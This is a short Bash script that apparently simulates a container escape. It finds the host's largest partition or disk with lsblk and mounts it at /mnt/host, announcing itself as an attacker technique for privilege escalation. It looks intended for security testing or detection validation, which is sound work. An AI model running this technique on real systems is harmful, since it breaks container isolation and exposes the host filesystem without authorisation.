#!/bin/bash

# define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

# mount root host filesystem
echo -e "\n${YELLOW}>>> [Privilege Escalation] Escape to Host Technique ${RESET}"
echo "Let's simulate the case when an attacker mounts root host filesystem inside the container"

# Initialize error variable
error=""

echo "Discovering root host devices and partitions ..."

# Discover root host partition (prefer partitions over raw disks)
# Extract device name - handle both simple (vda1, sda1) and NVMe (nvme0n1p1) patterns
# Get first column (device name), remove all special characters, keep only alphanumeric
device=$(lsblk -o NAME,SIZE,TYPE | grep -E "part" | sort -k2 -h | tail -n 1 | awk '{print $1}' | sed 's/[^a-zA-Z0-9]//g')

# If no partition found, fall back to the largest disk
if [[ -z "$device" ]]; then
    device=$(lsblk -o NAME,SIZE,TYPE -d | grep disk | sort -k2 -h | tail -n 1 | awk '{print $1}' | sed 's/[^a-zA-Z0-9]//g')
fi

if [[ -z "$device" ]]; then
    error="Failed to discover root host block device"
else
    echo "Trying to mount /dev/${device} ..."
    
    # Create mount point directory
    mkdir -p /mnt/host
    
    # Try to mount root host device
    if ! mount /dev/$device /mnt/host/ >/dev/null 2>&1; then
        error="Failed to mount /dev/$device"
    fi
fi

# Display result
if [[ -n "$error" ]]; then
    echo -e "${RED}Error! $error ${RESET}"
    else
    echo -e "${GREEN}Success! Mount attempt was successful ${RESET}"
fi